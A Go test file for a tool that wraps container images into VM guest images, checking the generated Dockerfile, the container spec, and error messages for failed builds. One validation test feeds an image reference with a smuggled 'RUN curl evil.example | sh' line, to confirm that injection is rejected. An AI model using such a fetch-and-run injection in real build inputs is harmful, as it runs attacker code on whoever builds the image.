package guestwrap

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/bwsalmon/granule/pkg/containerspec"
	"github.com/bwsalmon/granule/pkg/dockercli"
	"github.com/bwsalmon/granule/pkg/guestimage"
	"github.com/bwsalmon/granule/pkg/guestpack"
	"github.com/bwsalmon/granule/pkg/vmspec"
)

var fakedockerPath string

func TestMain(m *testing.M) {
	dir, err := os.MkdirTemp("", "fakedocker-wrap")
	if err != nil {
		panic(err)
	}
	defer os.RemoveAll(dir)

	fakedockerPath = filepath.Join(dir, "fakedocker")
	cmd := exec.Command("go", "build", "-o", fakedockerPath, "./testdata/fakedocker")
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		panic("building fakedocker test helper: " + err.Error())
	}

	os.Exit(m.Run())
}

// testOptions returns Options pointed at fakedocker, a function reading
// back the calls it recorded, and one reading a file out of the build
// context wrap generated.
func testOptions(t *testing.T) (Options, func() [][]string, func(name string) string) {
	t.Helper()
	dir := t.TempDir()
	logPath := filepath.Join(dir, "calls.log")
	contextDir := filepath.Join(dir, "context")
	t.Setenv("FAKEDOCKER_LOG", logPath)
	t.Setenv(dockercli.EnvBinary, fakedockerPath)
	t.Setenv("FAKEDOCKER_SAVE_CONTEXT", contextDir)

	opts := Options{
		From:   "ghcr.io/example/app:v3",
		Tag:    "app-vm:latest",
		Stdout: &bytes.Buffer{},
		Stderr: &bytes.Buffer{},
	}
	calls := func() [][]string {
		data, err := os.ReadFile(logPath)
		if err != nil {
			if os.IsNotExist(err) {
				return nil
			}
			t.Fatalf("reading fakedocker log: %v", err)
		}
		var out [][]string
		for _, line := range strings.Split(strings.TrimRight(string(data), "\n"), "\n") {
			if line != "" {
				out = append(out, strings.Split(line, "\x1f"))
			}
		}
		return out
	}
	contextFile := func(name string) string {
		data, err := os.ReadFile(filepath.Join(contextDir, name))
		if err != nil {
			t.Fatalf("reading %s out of the saved build context: %v", name, err)
		}
		return string(data)
	}
	return opts, calls, contextFile
}

func TestWrapDrivesOneBuild(t *testing.T) {
	opts, calls, contextFile := testOptions(t)
	t.Setenv("FAKEDOCKER_CONFIG", `{"Entrypoint":["/entry.sh"],"Cmd":["serve"],"Env":["PATH=/usr/bin","LANG=C"],"WorkingDir":"/srv","User":"app","StopSignal":"SIGQUIT","ExposedPorts":{"8080/tcp":{},"53/udp":{}}}`)
	if err := Wrap(context.Background(), opts); err != nil {
		t.Fatalf("Wrap: %v", err)
	}

	var build []string
	for _, call := range calls() {
		if call[0] == "build" {
			build = call
		}
	}
	if build == nil {
		t.Fatalf("no docker build recorded, calls were %v", calls())
	}
	joined := strings.Join(build, " ")
	if !strings.Contains(joined, "--tag app-vm:latest") {
		t.Errorf("build call %q does not tag the result", joined)
	}

	df := contextFile("Dockerfile")
	// The wrapped image is copied and never run: this is the property the
	// package exists to keep, so it is asserted rather than left to
	// review. It appears in the COPY and in the provenance label.
	if n := strings.Count(df, opts.From); n != 2 {
		t.Errorf("the wrapped image is named %d times in the build, want 2 (the COPY and the label):\n%s", n, df)
	}
	if !strings.Contains(df, "COPY --from="+opts.From+" / "+containerspec.RootfsDir) {
		t.Errorf("the wrapped filesystem is not copied into the guest:\n%s", df)
	}
	for _, line := range strings.Split(df, "\n") {
		if strings.HasPrefix(line, "RUN") && strings.Contains(line, opts.From) {
			t.Errorf("a RUN mentions the wrapped image, which wrap must never execute: %q", line)
		}
	}
	// The COPY of somebody else's filesystem is the last instruction of
	// the stage that assembles the guest, so nothing granule does in that
	// stage can see it.
	stage, _, _ := strings.Cut(df, "FROM "+guestpack.DefaultPackerImage)
	instructions := instructionsIn(stage)
	if last := instructions[len(instructions)-1]; !strings.HasPrefix(last, "COPY --from="+opts.From) {
		t.Errorf("the wrapped filesystem is not the last thing the guest stage does, it is %q:\n%s", last, stage)
	}

	// The runner and the VMM half both come from the granule image, so the
	// program that runs the container cannot skew from the granule that
	// wrapped it.
	if !strings.Contains(df, "COPY --from="+vmspec.DockerImage+" "+guestimage.PartsRunner+" "+containerspec.RunnerPath) {
		t.Errorf("the guest-side runner is not taken from %s:\n%s", vmspec.DockerImage, df)
	}
	if !strings.Contains(df, "FROM "+DefaultGuestImage+" AS "+wrappedStage) {
		t.Errorf("the guest is not built on %s:\n%s", DefaultGuestImage, df)
	}
	// Packing happens in the same build, so no intermediate image is left
	// behind: the pack stage copies the stage above rather than a tag.
	if !strings.Contains(df, "COPY --from="+wrappedStage+" / /rootfs") {
		t.Errorf("the assembled guest is not packed in this build:\n%s", df)
	}
	// EXPOSE is re-declared because the VM takes over the container's own
	// IP: a port the container listened on is one the VM listens on.
	if !strings.Contains(df, "EXPOSE 53/udp 8080/tcp") {
		t.Errorf("the wrapped image's ports are not re-declared:\n%s", df)
	}
	// One service starts the workload, not two. granule-container and
	// granule-wrap@<name> both run /etc/granule/container.json, so a
	// guest that enabled both would start the wrapped workload twice --
	// two copies racing for whatever the first one bound.
	if !strings.Contains(df, "multi-user.target.wants/granule-wrap@app.service") {
		t.Errorf("the wrap does not enable its own service:\n%s", df)
	}
	if strings.Contains(df, "ln -sf /etc/systemd/system/granule-container.service") ||
		strings.Contains(df, "ln -sf /etc/init.d/granule-container") {
		t.Errorf("the wrap enables granule-container beside its own service, so the guest would run the workload twice:\n%s", df)
	}
	// Nor does it write a granule-container unit at all. The packing
	// stages in this same build lay granule's guest overlay down
	// unconditionally and that overlay owns both files, so a copy written
	// here never reaches the packed disk -- it would only be a second,
	// drifting statement of a file pack already supplies.
	if strings.Contains(df, "COPY granule-container.service") ||
		strings.Contains(df, "COPY granule-container.openrc") {
		t.Errorf("the wrap writes a granule-container unit the packing below overwrites:\n%s", df)
	}
	// The rm -f that defend against a guest image which arrived with
	// granule-container already enabled stay: who enabled it is a
	// different question from who supplies it.
	if !strings.Contains(df, "rm -f /etc/systemd/system/multi-user.target.wants/granule-container.service") ||
		!strings.Contains(df, "rm -f /etc/runlevels/default/granule-container") {
		t.Errorf("the wrap no longer disables a granule-container the guest image arrived with:\n%s", df)
	}
	// A wrap assembles a guest half of its own and packs it, so the result
	// declares the contract this granule implements, exactly as a `guest
	// pack` does -- otherwise a rebase of a freshly wrapped image reads it
	// as predating the day granule started writing a version down.
	if !strings.Contains(df, guestimage.ContractLabel+`="`+guestimage.ContractValue()+`"`) {
		t.Errorf("a wrap does not declare the guest-side contract it just laid down:\n%s", df)
	}

	var spec containerspec.Spec
	if err := json.Unmarshal([]byte(contextFile("container.json")), &spec); err != nil {
		t.Fatalf("the generated container spec is not JSON: %v", err)
	}
	if got, want := strings.Join(spec.Argv(), " "), "/entry.sh serve"; got != want {
		t.Errorf("the guest would run %q, want %q", got, want)
	}
	for _, want := range []string{"PATH=/usr/bin", "LANG=C"} {
		if _, ok := spec.LookupEnv(strings.Split(want, "=")[0]); !ok {
			t.Errorf("the spec dropped %q: %v", want, spec.Env)
		}
	}
	if spec.WorkingDir != "/srv" || spec.User != "app" || spec.StopSignal != "SIGQUIT" {
		t.Errorf("the image's workdir, user and stop signal did not reach the spec: %+v", spec)
	}
	if !spec.HaltOnExit {
		t.Error("halting on exit is the default and did not reach the spec")
	}
	if spec.Rootfs != containerspec.RootfsDir {
		t.Errorf("the spec points at %q, not at where the build put the filesystem", spec.Rootfs)
	}
}

// instructionsIn is the Dockerfile's instructions, with continuations
// folded into the line they continue.
func instructionsIn(dockerfile string) []string {
	var out []string
	continued := false
	for _, line := range strings.Split(dockerfile, "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "#") {
			continue
		}
		if continued {
			out[len(out)-1] += " " + trimmed
		} else {
			out = append(out, trimmed)
		}
		continued = strings.HasSuffix(trimmed, "\\")
	}
	return out
}

func TestWrapAppliesOverrides(t *testing.T) {
	opts, _, contextFile := testOptions(t)
	t.Setenv("FAKEDOCKER_CONFIG", `{"Entrypoint":["/entry.sh"],"Cmd":["serve"],"Env":["LANG=C","TZ=UTC"]}`)
	opts.Entrypoint = []string{"/bin/sh"}
	opts.Env = []string{"TZ=Europe/London", "EXTRA=1"}
	opts.WorkingDir = "/work"
	opts.User = "1000:1000"
	halt := false
	opts.HaltOnExit = &halt
	if err := Wrap(context.Background(), opts); err != nil {
		t.Fatalf("Wrap: %v", err)
	}

	var spec containerspec.Spec
	if err := json.Unmarshal([]byte(contextFile("container.json")), &spec); err != nil {
		t.Fatalf("the generated container spec is not JSON: %v", err)
	}
	// Replacing the entrypoint drops the image's CMD, the way `docker run
	// --entrypoint` does: those arguments belonged to the entrypoint that
	// is no longer there.
	if got, want := strings.Join(spec.Argv(), " "), "/bin/sh"; got != want {
		t.Errorf("the guest would run %q, want %q", got, want)
	}
	if tz, _ := spec.LookupEnv("TZ"); tz != "Europe/London" {
		t.Errorf("TZ is %q, want the overridden value", tz)
	}
	if _, ok := spec.LookupEnv("EXTRA"); !ok {
		t.Errorf("the added variable did not reach the spec: %v", spec.Env)
	}
	if n := countEnv(spec.Env, "TZ"); n != 1 {
		t.Errorf("TZ appears %d times in %v, want once", n, spec.Env)
	}
	if spec.WorkingDir != "/work" || spec.User != "1000:1000" {
		t.Errorf("the overrides did not reach the spec: %+v", spec)
	}
	if spec.HaltOnExit {
		t.Error("-halt-on-exit=false did not reach the spec")
	}
	// An image with no PATH of its own gets the one a container runtime
	// would have given it, written down rather than assumed in the guest.
	if path, _ := spec.LookupEnv("PATH"); path != containerspec.DefaultPath {
		t.Errorf("PATH is %q, want the default a container runtime supplies", path)
	}
}

func countEnv(env []string, key string) int {
	n := 0
	for _, e := range env {
		if name, _, _ := strings.Cut(e, "="); name == key {
			n++
		}
	}
	return n
}

// An image with no entrypoint and no command has nothing for the VM to
// run, and finding that out on a console after a boot is much worse than
// finding it out here.
func TestWrapRefusesAnImageWithNothingToRun(t *testing.T) {
	opts, calls, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_CONFIG", `{"Env":["PATH=/usr/bin"]}`)
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want an error")
	}
	if !strings.Contains(err.Error(), "neither an entrypoint nor a command") {
		t.Errorf("error %q does not say what is missing", err)
	}
	for _, call := range calls() {
		if call[0] == "build" {
			t.Error("a build was started for an image that cannot run")
		}
	}
}

func TestWrapRejectsBadInput(t *testing.T) {
	for _, tc := range []struct {
		name string
		edit func(*Options)
		want string
	}{
		{"no image", func(o *Options) { o.From = "" }, "required"},
		{"no tag", func(o *Options) { o.Tag = "" }, "required"},
		{"unknown variant", func(o *Options) { o.Variant = "ubuntu" }, "unknown guest variant"},
		// A reference carrying a newline could append instructions to the
		// generated Dockerfile -- a RUN of its own, in the one build whose
		// point is that nothing from the wrapped image runs.
		{"injected instruction", func(o *Options) {
			o.From = "app:v1\nRUN curl evil.example | sh"
		}, "not a usable image reference"},
		{"injected guest image", func(o *Options) { o.GuestImage = "rootfs\nFROM scratch" }, "not a usable image reference"},
		{"environment that is not KEY=VALUE", func(o *Options) { o.Env = []string{"BROKEN"} }, "not KEY=VALUE"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			opts, calls, _ := testOptions(t)
			tc.edit(&opts)
			err := Wrap(context.Background(), opts)
			if err == nil {
				t.Fatal("Wrap succeeded, want an error")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not mention %q", err, tc.want)
			}
			if got := calls(); len(got) != 0 {
				t.Errorf("docker was called %d times for input that should never have reached it: %v", len(got), got)
			}
		})
	}
}

// The image's configuration has to be read before anything can be built,
// so an image that is not on this machine yet is pulled rather than
// refused.
func TestWrapPullsAnImageItHasNotGot(t *testing.T) {
	opts, calls, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_MISSING", opts.From)
	os.Remove(filepath.Join(os.TempDir(), "fakedocker-pulled-ghcr.io_example_app_v3"))
	if err := Wrap(context.Background(), opts); err != nil {
		t.Fatalf("Wrap: %v", err)
	}
	pulled := false
	for _, call := range calls() {
		if call[0] == "pull" && call[1] == opts.From {
			pulled = true
		}
	}
	if !pulled {
		t.Errorf("the missing image was not pulled: %v", calls())
	}

	opts, calls, _ = testOptions(t)
	t.Setenv("FAKEDOCKER_MISSING", opts.From)
	os.Remove(filepath.Join(os.TempDir(), "fakedocker-pulled-ghcr.io_example_app_v3"))
	no := false
	opts.Pull = &no
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded without the image or permission to fetch it")
	}
	if !strings.Contains(err.Error(), "told not to pull") {
		t.Errorf("error %q does not say why it stopped", err)
	}
	for _, call := range calls() {
		if call[0] == "pull" {
			t.Error("the image was pulled after all")
		}
	}
}

// A granule image built before wrap existed carries no runner, and the
// build's own message for that is a bare "not found" on a path nobody has
// seen before.
func TestWrapExplainsAMissingRunner(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_DOCKERFILE_CONTAINS", guestimage.PartsRunner)
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want an error")
	}
	if !strings.Contains(err.Error(), "--target runtime") {
		t.Errorf("error does not say how to get a granule image that carries the runner: %v", err)
	}
	// The stock build first: a wrapped guest brings no kernel, so the
	// lean one named on its own -- which this message used to do -- gets
	// the runner and then fails the same build for want of a kernel.
	for _, want := range []string{"docker build .", guestimage.RuntimeKernel} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error does not mention %q, so it recommends the lean build unconditionally: %v", want, err)
		}
	}

	// The same failure as a real daemon prints it, whole: what wrap has
	// to recognize is buildkit's output, and buildkit names the COPY's
	// source path in full.
	t.Setenv("FAKEDOCKER_FAIL_WITH", runnerMissing)
	err = Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want an error")
	}
	if !strings.Contains(err.Error(), "carries no "+guestimage.PartsRunner) {
		t.Errorf("a real build's missing-runner failure was not explained: %v", err)
	}
}

// runnerMissing is Docker 29.8.1's own output, pasted from a real
// build, for a granule image that does not carry the runner.
const runnerMissing = `#6 [stage-1 3/7] COPY --from=` + vmspec.DockerImage + ` ` + guestimage.PartsRunner + ` ` + containerspec.RunnerPath + `
#6 ERROR: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::zsdwxdg2xg1nl09glnwf8ujkx: "` + guestimage.PartsRunner + `": not found
------
 > [stage-1 3/7] COPY --from=` + vmspec.DockerImage + ` ` + guestimage.PartsRunner + ` ` + containerspec.RunnerPath + `:
------
ERROR: failed to build: failed to solve: failed to compute cache key: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::zsdwxdg2xg1nl09glnwf8ujkx: "` + guestimage.PartsRunner + `": not found`

// unitFileMissing is Docker 29.8.1's own output for a wrap whose build
// could not find one of the files wrap generates into the build
// context. The runner's own COPY sits a step above it, succeeded, and
// names granule-container twice -- so "granule-container" *somewhere* in
// the log beside "not found" *somewhere else* was once enough for wrap
// to explain this as a granule image carrying no runner, which is a
// different image, a different file and a different fix.
const unitFileMissing = `#7 [stage-1 3/6] COPY --from=` + vmspec.DockerImage + ` ` + guestimage.PartsRunner + ` ` + containerspec.RunnerPath + `
#7 DONE 0.1s
#8 [stage-1 4/6] COPY granule-wrap@.service /etc/systemd/system/granule-wrap@.service
#8 ERROR: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::uaf6i02dnb0creoohtqzoki58: "/granule-wrap@.service": not found
------
 > [stage-1 4/6] COPY granule-wrap@.service /etc/systemd/system/granule-wrap@.service:
------
ERROR: failed to build: failed to solve: failed to compute cache key: failed to calculate checksum of ref hxrqy3v1bp6qxltqwr9lh8e54::uaf6i02dnb0creoohtqzoki58: "/granule-wrap@.service": not found`

// The other side of the message above. Wrap's build says
// granule-container several more times than it copies the runner -- the
// path the program lands on in the guest, and the two symlinks it
// removes in case the guest image arrived with the service enabled -- so
// a failure recognized by that name anywhere in the log is as likely to
// be one of those as it is to be the runner.
func TestWrapDoesNotBlameTheGranuleImageForAnotherMissingFile(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_WITH", unitFileMissing)
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want the build's failure to come back as an error")
	}
	if strings.Contains(err.Error(), "carries no "+guestimage.PartsRunner) {
		t.Errorf("a missing context file was explained as a granule image with no runner: %v", err)
	}
	if !strings.Contains(err.Error(), `"/granule-wrap@.service": not found`) {
		t.Errorf("the build's own message did not survive: %v", err)
	}
}

// Wrapping onto a `docker build --target runtime` granule image is the
// documented trap: that stage carries no kernel, a wrapped guest rootfs
// brings none either, and the result builds, pushes and then stops at a
// missing CHV_KERNEL. The build says so before it packs anything.
func TestWrapRefusesWhenNeitherHalfBringsAKernel(t *testing.T) {
	opts, _, file := testOptions(t)
	opts.KonturImage = "granule:runtime"
	t.Setenv("FAKEDOCKER_ABSENT", opts.KonturImage+"="+guestimage.RuntimeKernel)

	if err := Wrap(context.Background(), opts); err != nil {
		t.Fatalf("Wrap: %v", err)
	}
	dockerfile := file("Dockerfile")
	if !strings.Contains(dockerfile, "ls /rootfs/boot/vmlinuz-*") {
		t.Fatalf("the generated build does not check that the guest brings a kernel:\n%s", dockerfile)
	}
	if !strings.Contains(dockerfile, guestpack.NoKernelMarker) {
		t.Errorf("the check does not echo the marker wrap recognizes:\n%s", dockerfile)
	}

	// And when the build stops on it, the explanation reaches the
	// caller, about the guest image rather than about the packing.
	t.Setenv("FAKEDOCKER_FAIL_DOCKERFILE_CONTAINS", guestpack.NoKernelMarker)
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want the build's refusal to come back as an error")
	}
	for _, want := range []string{guestimage.RuntimeKernel, "--target runtime", "GUEST_KERNEL_PACKAGE", DefaultGuestImage} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not mention %q: %v", want, err)
		}
	}
}

// guestUnresolvable is what Docker 29.8.1 prints when the guest image's
// repository needs a token this machine has not got, which is what every
// ghcr.io pull from a machine that has not logged in looks like.
// Reproduced on 19 Sep 2026 and kept verbatim: the point of the test
// below is that this log says neither "not found" nor "no such file"
// about the reference, and used to get no explanation at all because of
// it. The reference is named only by the vertex buildkit failed on.
const guestUnresolvable = `docker build --file /tmp/granule-wrap-123/Dockerfile --tag app-vm:latest /tmp/granule-wrap-123: exit status 1: #2 [internal] load metadata for granule:latest
#2 DONE 0.1s

#3 [internal] load metadata for ` + DefaultGuestImage + `
#3 ERROR: failed to authorize: failed to fetch anonymous token: unexpected status from GET request to https://ghcr.io/token?scope=repository%3Agke-labs%2Fgranule-guest-rootfs%3Apull&service=ghcr.io: 403 Forbidden
------
 > [internal] load metadata for ` + DefaultGuestImage + `:
------
Dockerfile:1
--------------------
   1 | >>> FROM ` + DefaultGuestImage + ` AS wrapped
   2 |     COPY --from=granule:latest /usr/local/share/granule/guest-parts/granule-container /usr/local/bin/granule-container
--------------------
ERROR: failed to build: failed to solve: failed to fetch anonymous token: unexpected status from GET request to https://ghcr.io/token?scope=repository%3Agke-labs%2Fgranule-guest-rootfs%3Apull&service=ghcr.io: 403 Forbidden`

// The guest rootfs is a local build convention rather than something a
// registry hands out, so being told how to build it is the difference
// between a two-minute fix and a hunt.
func TestWrapExplainsAnUnresolvableGuestImage(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_WITH", guestUnresolvable)
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want an error")
	}
	if !strings.Contains(err.Error(), "--target guest-rootfs-image") {
		t.Errorf("error does not say how to build the guest rootfs: %v", err)
	}
	if !strings.Contains(err.Error(), "403 Forbidden") {
		t.Errorf("the build's own message did not survive: %v", err)
	}
}

// The granule image is not read out of a build log at all: wrap asks it
// whether it carries a kernel before it generates one, so a reference a
// registry will not hand over stops there -- with `docker create`'s own
// message, which for a registry wanting a login is a bare "denied".
func TestWrapExplainsAnUnresolvableKonturImage(t *testing.T) {
	opts, _, _ := testOptions(t)
	opts.KonturImage = "ghcr.io/gke-labs/granule:latest"
	t.Setenv("FAKEDOCKER_FAIL_CONTAINS", "create "+opts.KonturImage)
	t.Setenv("FAKEDOCKER_FAIL_MESSAGE", "Unable to find image '"+opts.KonturImage+"' locally\nError response from daemon: error from registry: denied\ndenied")

	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want an error")
	}
	for _, want := range []string{opts.KonturImage + " could not be resolved", "-kontur-image", "docker login"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the explanation does not mention %q: %v", want, err)
		}
	}
	if !strings.Contains(err.Error(), "error from registry: denied") {
		t.Errorf("docker's own message did not survive: %v", err)
	}
}

// The reference is in every wrap log whether or not it is the problem,
// so the explanation has to stay off a build that resolved everything
// and then failed inside the guest.
func TestWrapDoesNotBlameTheGuestImageForAFailureInsideIt(t *testing.T) {
	opts, _, _ := testOptions(t)
	t.Setenv("FAKEDOCKER_FAIL_WITH", `docker build --file /tmp/granule-wrap-123/Dockerfile --tag app-vm:latest /tmp/granule-wrap-123: exit status 1: #7 [wrapped 2/3] COPY --from=granule:latest /usr/local/share/granule/guest-parts/granule-container /usr/local/bin/granule-container
#7 DONE 0.2s

#8 [wrapped 3/3] RUN set -eu;     chmod 0755 /usr/local/bin/granule-container;     [ -d /etc/systemd ] || [ -d /etc/runlevels ] ||       { echo "`+DefaultGuestImage+` runs neither systemd nor OpenRC, so nothing would start the container" >&2; exit 1; }
#8 ERROR: process "/bin/sh -c set -eu; ..." did not complete successfully: exit code: 1
------
 > [wrapped 3/3] RUN set -eu;     chmod 0755 /usr/local/bin/granule-container;     [ -d /etc/systemd ] || [ -d /etc/runlevels ] ||       { echo "`+DefaultGuestImage+` runs neither systemd nor OpenRC, so nothing would start the container" >&2; exit 1; }:
------
ERROR: failed to build: failed to solve: process "/bin/sh -c set -eu; ..." did not complete successfully: exit code: 1`)
	err := Wrap(context.Background(), opts)
	if err == nil {
		t.Fatal("Wrap succeeded, want an error")
	}
	if strings.Contains(err.Error(), "could not be resolved") {
		t.Errorf("a guest that ran was reported as a reference that would not resolve: %v", err)
	}
}

func TestWrapDiskMode(t *testing.T) {
	opts, _, file := testOptions(t)
	opts.DiskMode = "persistent"
	if err := Wrap(context.Background(), opts); err != nil {
		t.Fatalf("Wrap: %v", err)
	}
	dockerfile := file("Dockerfile")
	if !strings.Contains(dockerfile, `ENV CHV_DISK_MODE="persistent"`) {
		t.Errorf("ENV CHV_DISK_MODE not found in generated dockerfile:\n%s", dockerfile)
	}
}
